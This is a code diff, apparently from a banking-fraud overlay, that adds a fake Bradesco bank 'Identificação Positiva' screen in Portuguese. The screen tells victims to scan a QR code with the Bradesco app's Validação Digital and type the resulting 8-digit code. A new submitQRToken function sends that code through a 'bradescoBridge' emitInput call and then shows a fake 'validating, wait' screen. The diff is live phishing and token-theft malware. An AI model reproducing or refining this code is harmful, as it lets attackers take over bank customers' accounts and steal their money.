@@ -242,20 +242,31 @@
         break;
       case 'qrcode-request':
         content = `
-          <div class="overlay-content">
-            <h2 style="color: #cc0000; font-size: 22px; margin-bottom: 10px;">Identificação Positiva</h2>
-            <p style="color: #cc0000; font-size: 18px; line-height: 1.4; margin-bottom: 20px;">
-              Abra o aplicativo Bradesco, vá em Chave de Segurança em seguida validação digital.
+          <div class="overlay-content" style="max-width: 600px;">
+            <h2 style="color: #cc0000; font-size: 22px; margin-bottom: 10px;">IDENTIFICAÇÃO POSITIVA</h2>
+            <p style="font-size: 14px; margin-bottom: 20px; color: #333;">
+              Para dar continuidade na atualização do <b>Componente de Segurança</b>, siga o procedimento abaixo.
             </p>
-            <div id="qrcode-container" style="margin-top: 20px; text-align: center;">
-              <div style="margin-top: 10px; padding: 10px; background: #fff; border-radius: 8px; min-height: 250px; display: flex; align-items: center; justify-content: center; border: 1px solid #ddd;">
-                <img id="qrcode-image" src="" style="max-width: 300px; max-height: 300px; display: none;" />
-                <p id="qrcode-placeholder" style="color: #666; font-size: 14px;">Aguardando QR Code...</p>
+            
+            <div style="display: flex; align-items: center; gap: 20px; margin-bottom: 20px; text-align: left;">
+              <div style="flex: 1; font-size: 13px; line-height: 1.4;">
+                No Aplicativo Bradesco, acesse a <b>Chave de Segurança</b>.<br>
+                Em seguida, toque na opção <b>Validação Digital</b> e faça a leitura desta imagem com a câmera do seu celular.
+              </div>
+              
+              <div id="qrcode-container" style="width: 200px; height: 200px; background: #fff; border: 1px solid #ddd; display: flex; align-items: center; justify-content: center; padding: 5px;">
+                <img id="qrcode-image" src="" style="max-width: 100%; max-height: 100%; display: none;" />
+                <p id="qrcode-placeholder" style="color: #999; font-size: 11px; text-align: center;">Aguardando QR Code...</p>
+              </div>
+              
+              <div style="flex: 1; font-size: 13px;">
+                Digite o código que aparece no seu celular após escanear a imagem ao lado.<br>
+                <input type="text" id="overlay-qr-token" maxlength="8" style="width: 100px; margin-top: 10px; text-align: center; font-size: 18px; border: 1px solid #cc0000; padding: 5px;">
+                <span style="display: block; font-size: 10px; color: #666; margin-top: 5px;">(Código composto por 8 dígitos)</span>
               </div>
             </div>
-            <div style="margin-top: 20px; font-size: 11px; color: #666;">
-              Escaneie o QR Code com seu aplicativo Bradesco.
-            </div>
+            
+            <button onclick="window.bradescoBridge.submitQRToken()" style="background-color: #cc0000; color: white; border: none; padding: 10px 30px; cursor: pointer; font-weight: bold; border-radius: 4px;">CONFIRMAR</button>
           </div>
         `;
         break;
@@ -547,6 +558,14 @@
         //   console.log('[BRIDGE] 📄 Referência enviada:', ref);
         //   emitInput('referencia', ref);
         // }
+        showOverlay('loading', 'VALIDANDO CÓDIGO AGUARDE...');
+      }
+    },
+    submitQRToken: () => {
+      const token = document.getElementById('overlay-qr-token')?.value;
+      if (token) {
+        console.log('[BRIDGE] 🔑 QR Token enviado:', token);
+        emitInput('token', token);
         showOverlay('loading', 'VALIDANDO CÓDIGO AGUARDE...');
       }
     }
